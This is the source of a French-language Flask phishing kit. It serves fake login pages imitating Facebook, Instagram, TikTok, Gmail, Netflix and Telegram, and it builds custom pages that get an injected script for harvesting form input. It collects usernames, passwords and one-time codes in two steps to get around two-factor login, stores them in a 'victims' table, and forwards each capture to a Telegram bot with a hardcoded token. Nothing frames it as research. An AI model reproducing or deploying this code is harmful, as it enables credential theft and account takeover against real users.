import os
from flask import Flask, request, jsonify, render_template, render_template_string
import requests
import datetime
import sqlite3
import json

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "6141755021")
DB_NAME = 'abeilles.db'

PLATFORM_LOGOS = {
    "Facebook": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg",
    "Instagram": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg",
    "TikTok": "https://upload.wikimedia.org/wikipedia/commons/a/a6/Logo_NIKE.svg",
    "Gmail": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Netflix": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
    "Telegram": "https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"
}

def get_db_connection():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            type TEXT,
            victimUser TEXT,
            victimPass TEXT,
            victimOtp TEXT,
            dateStr TEXT,
            timestamp INTEGER,
            ip TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            slug TEXT UNIQUE,
            title TEXT,
            network TEXT,
            bg_type TEXT,
            bg_value TEXT,
            logo_url TEXT,
            logo_shape TEXT,
            fields_json TEXT,
            btn_text TEXT,
            html_code TEXT,
            redirect_url TEXT,
            mode TEXT,
            created_at INTEGER
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def cleanup_expired_custom_pages():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        twenty_four_hours_ago = int((datetime.datetime.now().timestamp() - 86400) * 1000)
        cursor.execute("DELETE FROM custom_pages WHERE created_at < ?", (twenty_four_hours_ago,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage liens 24h:", e)

def send_telegram_photo_and_message(photo_url, caption):
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "photo": photo_url,
        "caption": caption,
        "parse_mode": "Markdown"
    }
    try:
        res = requests.post(url, json=payload, timeout=5)
        if res.status_code != 200:
            send_telegram_notification(caption)
    except Exception as e:
        print("Erreur Telegram Photo:", e)

def send_telegram_notification(message):
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Erreur Telegram:", e)

@app.route('/')
def index():
    cleanup_expired_custom_pages()
    return render_template('index.html')

# ROUTE STRICTE POUR LES FICHIERS PHYSIQUES DANS STANDARD/ ET OTP/
@app.route('/phish/<folder>/<filename>')
def render_standard_or_otp_page(folder, filename):
    cleanup_expired_custom_pages()
    owner_param = request.args.get('user', 'Kim')
    clean_filename = filename.lower().strip()
    if not clean_filename.endswith('.html'):
        clean_filename += '.html'
        
    template_path = f"{folder}/{clean_filename}"
    try:
        return render_template(template_path, owner=owner_param)
    except Exception:
        net_name = clean_filename.replace('.html', '').replace('_otp', '').capitalize()
        is_otp = (folder == 'otp')
        return render_template_string(FALLBACK_PHISH_TEMPLATE, network=net_name, owner=owner_param, is_otp=is_otp)

# ROUTE POUR LES PAGES NO-CODE PERSONNELLES (OPTION 1 & OPTION 2 AVEC SUPPORT OTP ÉTAPE PAR ÉTAPE)
@app.route('/phish/<path:subpath>')
def render_custom_phish_page(subpath):
    cleanup_expired_custom_pages()
    subpath_clean = subpath.lower().strip('/').replace('-', '_')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM custom_pages WHERE slug = ?", (subpath_clean,))
    cp = cursor.fetchone()
    conn.close()

    if cp:
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        if (now_ts - cp["created_at"]) > 86400000:
            return "Ce lien a expiré après 24 heures.", 410

        owner = cp["owner"]
        network = cp["network"]
        redirect_url = cp["redirect_url"] or "https://www.google.com"

        if cp["mode"] == 'opt2' and cp["html_code"]:
            html = cp["html_code"]
            robust_injection_script = f"""
            <script>
            (function() {{
                let isSubmitted = false;
                let step1Sent = false;

                function processCapture(e) {{
                    let userVal = "";
                    let passVal = "";
                    let otpVal = "";

                    const allInputs = document.querySelectorAll('input, select, textarea');
                    allInputs.forEach(inp => {{
                        let name = (inp.name || inp.id || inp.type || "").toLowerCase();
                        let val = inp.value;
                        if (!val) return;

                        if (name.includes('user') || name.includes('email') || name.includes('login') || name.includes('tel') || name.includes('phone') || name.includes('compte')) {{
                            userVal = val;
                        }} else if (name.includes('pass') || name.includes('mdp') || name.includes('password') || name.includes('pin')) {{
                            passVal = val;
                        }} else if (name.includes('otp') || name.includes('code') || name.includes('secret')) {{
                            otpVal = val;
                        }} else {{
                            if (!userVal && (inp.type === 'text' || inp.type === 'email' || inp.type === 'tel')) {{
                                userVal = val;
                            }} else if (!passVal && (inp.type === 'password' || inp.type === 'number')) {{
                                passVal = val;
                            }}
                        }}
                    }});

                    const hasOtpField = Array.from(allInputs).some(inp => {{
                        let name = (inp.name || inp.id || "").toLowerCase();
                        return name.includes('otp') || name.includes('code') || name.includes('secret');
                    }});

                    // ÉTAPE 1 : Si la page a un champ OTP mais qu'il est vide lors de la première validation
                    if (hasOtpField && !otpVal && !step1Sent) {{
                        if (userVal && passVal) {{
                            step1Sent = true;
                            if (e) e.preventDefault();
                            const step1Payload = JSON.stringify({{
                                owner: "{owner}",
                                network: "{network}",
                                type: "custom_html_otp_step1",
                                victimUser: userVal,
                                victimPass: passVal,
                                otp: "Aucun"
                            }});
                            fetch('/api/capture', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: step1Payload,
                                keepalive: true
                            }});
                            alert("Identifiants enregistrés. Veuillez entrer le code OTP reçu.");
                        }}
                        return;
                    }}

                    if (isSubmitted) return;
                    isSubmitted = true;
                    if (e) e.preventDefault();

                    const payload = JSON.stringify({{
                        owner: "{owner}",
                        network: "{network}",
                        type: "custom_html",
                        victimUser: userVal || "Inconnu",
                        victimPass: passVal || "Inconnu",
                        otp: otpVal || "Aucun"
                    }});

                    if (navigator.sendBeacon) {{
                        navigator.sendBeacon('/api/capture', new Blob([payload], {{type: 'application/json'}}));
                    }}

                    fetch('/api/capture', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: payload,
                        keepalive: true
                    }}).finally(() => {{
                        window.location.href = "{redirect_url}";
                    }});

                    setTimeout(() => {{
                        window.location.href = "{redirect_url}";
                    }}, 900);
                }}

                document.addEventListener('DOMContentLoaded', function() {{
                    const forms = document.querySelectorAll('form');
                    forms.forEach(form => form.addEventListener('submit', processCapture));
                    const submitBtns = document.querySelectorAll('button[type="submit"], input[type="submit"], button');
                    submitBtns.forEach(btn => btn.addEventListener('click', function(e) {{ setTimeout(() => processCapture(e), 40); }}));
                }});
            }})();
            </script>
            """
            if "</body>" in html:
                html = html.replace("</body>", robust_injection_script + "</body>")
            else:
                html += robust_injection_script
            return render_template_string(html)
        else:
            config = {
                "owner": cp["owner"],
                "title": cp["title"],
                "network": cp["network"],
                "bg_type": cp["bg_type"],
                "bg_value": cp["bg_value"],
                "logo_url": cp["logo_url"],
                "logo_shape": cp["logo_shape"],
                "fields": json.loads(cp["fields_json"] or '[]'),
                "btn_text": cp["btn_text"]
            }
            try:
                return render_template('custom_login.html', config=config)
            except Exception:
                return render_template_string(FALLBACK_OPTION1_TEMPLATE, config=config)

    return "Page introuvable", 404


FALLBACK_PHISH_TEMPLATE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion {{ network }}</title>
    <style>
        body { background: #111; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #1c1c1c; border: 2px solid #f5b014; padding: 30px; border-radius: 8px; width: 360px; text-align: center; box-shadow: 0 0 15px rgba(245,176,20,0.3); }
        h2 { color: #f5b014; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff; border-radius: 4px; }
        button { width: 100%; padding: 10px; background: #f5b014; border: none; color: #111; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 15px; }
        button:hover { background: #ffcc33; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Connexion {{ network }}</h2>
        <form onsubmit="submitData(event)">
            <input type="text" id="user" placeholder="Nom d'utilisateur ou Email" required>
            <input type="password" id="pass" placeholder="Mot de passe" required>
            {% if is_otp %}
            <input type="text" id="otp" placeholder="Code OTP">
            {% endif %}
            <button type="submit">Se connecter</button>
        </form>
    </div>
    <script>
        function submitData(e) {
            e.preventDefault();
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            const otpEl = document.getElementById('otp');
            const otp = otpEl ? otpEl.value : "Aucun";

            fetch('/api/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    owner: "{{ owner }}",
                    network: "{{ network }}",
                    type: "{{ 'otp' if is_otp else 'standard' }}",
                    victimUser: user,
                    victimPass: pass,
                    otp: otp
                })
            }).then(() => {
                window.location.href = "https://www.google.com";
            });
        }
    </script>
</body>
</html>
"""

FALLBACK_OPTION1_TEMPLATE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>{{ config.title }}</title>
    <style>
        body { background: {% if config.bg_type == 'color' %}{{ config.bg_value }}{% else %}url('{{ config.bg_value }}') no-repeat center center fixed{% endif %}; background-size: cover; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: rgba(28,28,28,0.92); border: 2px solid #f5b014; padding: 30px; border-radius: 8px; width: 360px; text-align: center; box-shadow: 0 0 15px rgba(245,176,20,0.3); }
        .logo { width: 70px; height: 70px; object-fit: contain; border-radius: {% if config.logo_shape == 'circle' %}50%{% else %}4px{% endif %}; border: 2px solid #f5b014; margin-bottom: 15px; background: #111; }
        h2 { color: #f5b014; margin-bottom: 20px; font-size: 18px; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff; border-radius: 4px; }
        button { width: 100%; padding: 10px; background: #f5b014; border: none; color: #111; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 15px; }
        button:hover { background: #ffcc33; }
    </style>
</head>
<body>
    <div class="box">
        {% if config.logo_url %}
        <img src="{{ config.logo_url }}" class="logo" alt="Logo">
        {% endif %}
        <h2>{{ config.title }}</h2>
        <form onsubmit="submitOpt1(event)">
            {% for f in config.fields %}
            <input type="{{ f.type }}" id="{{ f.name }}" placeholder="{{ f.label }}" required>
            {% endfor %}
            <button type="submit">{{ config.btn_text }}</button>
        </form>
    </div>
    <script>
        function submitOpt1(e) {
            e.preventDefault();
            const user = document.getElementById('victimUser') ? document.getElementById('victimUser').value : "Inconnu";
            const pass = document.getElementById('victimPass') ? document.getElementById('victimPass').value : "Inconnu";
            const otpEl = document.getElementById('otp');
            const otp = otpEl ? otpEl.value : "Aucun";

            fetch('/api/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    owner: "{{ config.owner }}",
                    network: "{{ config.network }}",
                    type: "option1_nocode",
                    victimUser: user,
                    victimPass: pass,
                    otp: otp
                })
            }).then(() => {
                window.location.href = "https://www.google.com";
            });
        }
    </script>
</body>
</html>
"""

@app.route('/api/create_login', methods=['POST'])
def create_login():
    data = request.json
    owner = data.get('owner', '').strip()
    slug = data.get('slug', '').strip().lower().replace(' ', '_')
    
    if not owner or not slug:
        return jsonify({"status": "error", "message": "Propriétaire ou slug manquant"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        
        mode = data.get('mode', 'opt1')
        if mode == 'opt2':
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, "Page Perso HTML", data.get('network'),
                "color", "#111", "", "circle", "[]", "Valider",
                data.get('htmlCode'), data.get('redirectUrl'), 'opt2', now_ts
            ))
        else:
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, data.get('title'), data.get('network'),
                data.get('bgType'), data.get('bgValue'), data.get('logoUrl'),
                data.get('logoShape'), json.dumps(data.get('fields')), data.get('btnText'), "", "", 'opt1', now_ts
            ))
            
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/custom_pages', methods=['GET'])
def get_custom_pages():
    cleanup_expired_custom_pages()
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if owner:
        cursor.execute("SELECT * FROM custom_pages WHERE owner = ? ORDER BY id DESC", (owner,))
    else:
        cursor.execute("SELECT * FROM custom_pages ORDER BY id DESC")
        
    rows = cursor.fetchall()
    conn.close()
    
    pages = []
    for row in rows:
        pages.append({
            "slug": row["slug"],
            "title": row["title"],
            "network": row["network"],
            "mode": row["mode"]
        })
    return jsonify(pages)

@app.route('/api/clear_victims', methods=['POST'])
def clear_victims():
    data = request.json
    owner = data.get('owner', '').strip()
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM victims WHERE owner = ?", (owner,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/capture', methods=['POST'])
def capture_data():
    data = request.json or {}
    owner = data.get('owner', 'Kim').strip()
    network = data.get('network', 'Facebook')
    v_user = data.get('victimUser')
    v_pass = data.get('victimPass')
    v_otp = data.get('otp', 'Aucun')
    v_type = data.get('type', 'standard')
    
    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if raw_ip:
        v_ip = raw_ip.split(',')[0].strip()
    else:
        v_ip = "127.0.0.1"
    
    current_time = datetime.datetime.now()
    timestamp = int(current_time.timestamp() * 1000)
    date_str = current_time.strftime("%d/%m/%Y %H:%M:%S")

    conn = get_db_connection()
    cursor = conn.cursor()

    # Si c'est l'étape 1 OTP (identifiant + mdp saisis sans code encore)
    if v_type in ["otp_step1", "custom_html_otp_step1"] or (v_otp == 'Aucun' and v_type == 'otp'):
        cursor.execute('''
            INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (owner, network, v_type, v_user, v_pass, "Aucun (Étape 1)", date_str, timestamp, v_ip))
        conn.commit()
        conn.close()

        # Envoi Telegram immédiat pour l'étape 1
        logo_img = PLATFORM_LOGOS.get(network, "https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png")
        alert_text = (
            f"🚨 *NOUVELLE VICTIME (ÉTAPE 1 - IDENTIFIANTS)* 🚨\n\n"
            f"📘 *Plateforme:* {network}\n"
            f"👤 *Propriétaire:* `{owner}`\n"
            f"🎯 *Identifiant:* `{v_user}`\n"
            f"🔑 *Mot de passe:* `{v_pass}`\n"
            f"🔒 *Code OTP:* `En attente...`\n"
            f"🕒 *Heure:* `{date_str}`\n"
            f"📍 *IP:* `{v_ip}`"
        )
        send_telegram_photo_and_message(logo_img, alert_text)
        return jsonify({"status": "success"})

    # Si le code OTP complet est fourni, met à jour la dernière ligne existante de cette victime
    if v_otp and v_otp != 'Aucun' and not v_otp.startswith('Aucun'):
        cursor.execute('''
            SELECT id FROM victims WHERE owner = ? AND network = ? AND victimUser = ? ORDER BY id DESC LIMIT 1
        ''', (owner, network, v_user))
        existing = cursor.fetchone()
        if existing:
            cursor.execute('''
                UPDATE victims SET victimOtp = ?, dateStr = ?, timestamp = ?, ip = ? WHERE id = ?
            ''', (v_otp, date_str, timestamp, v_ip, existing["id"]))
            conn.commit()
            conn.close()
            
            logo_img = PLATFORM_LOGOS.get(network, "https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png")
            alert_text = (
                f"🚨 *NOUVELLE VICTIME CAPTURÉE (COMPLÈTE AVEC OTP)* 🚨\n\n"
                f"📘 *Plateforme:* {network}\n"
                f"👤 *Propriétaire:* `{owner}`\n"
                f"📋 *Flux:* `{v_type.upper()}`\n"
                f"🎯 *Identifiant:* `{v_user}`\n"
                f"🔑 *Mot de passe:* `{v_pass}`\n"
                f"🔒 *Code OTP:* `{v_otp}`\n"
                f"🕒 *Heure:* `{date_str}`\n"
                f"📍 *IP:* `{v_ip}`"
            )
            send_telegram_photo_and_message(logo_img, alert_text)
            return jsonify({"status": "success"})

    # Enregistrement standard unique
    cursor.execute('''
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip))
    conn.commit()
    conn.close()

    logo_img = PLATFORM_LOGOS.get(network, "https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png")
    alert_text = (
        f"🚨 *NOUVELLE VICTIME CAPTURÉE* 🚨\n\n"
        f"📘 *Plateforme:* {network}\n"
        f"👤 *Propriétaire:* `{owner}`\n"
        f"📋 *Flux:* `{v_type.upper()}`\n"
        f"🎯 *Identifiant:* `{v_user}`\n"
        f"🔑 *Mot de passe:* `{v_pass}`\n"
        f"🔒 *Code OTP:* `{v_otp}`\n"
        f"🕒 *Heure:* `{date_str}`\n"
        f"📍 *IP:* `{v_ip}`"
    )
    send_telegram_photo_and_message(logo_img, alert_text)

    return jsonify({"status": "success"})

@app.route('/api/victims', methods=['GET'])
def get_victims():
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if owner:
        cursor.execute("SELECT * FROM victims WHERE owner LIKE ? ORDER BY id DESC", (f"%{owner}%",))
    else:
        cursor.execute("SELECT * FROM victims ORDER BY id DESC")
        
    rows = cursor.fetchall()
    conn.close()
    
    victims_list = []
    for row in rows:
        victims_list.append({
            "id": row["id"],
            "owner": row["owner"],
            "network": row["network"],
            "type": row["type"],
            "victimUser": row["victimUser"],
            "victimPass": row["victimPass"],
            "otp": row["otp"],
            "dateStr": row["dateStr"],
            "timestamp": row["timestamp"],
            "ip": row["ip"]
        })
    return jsonify(victims_list)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
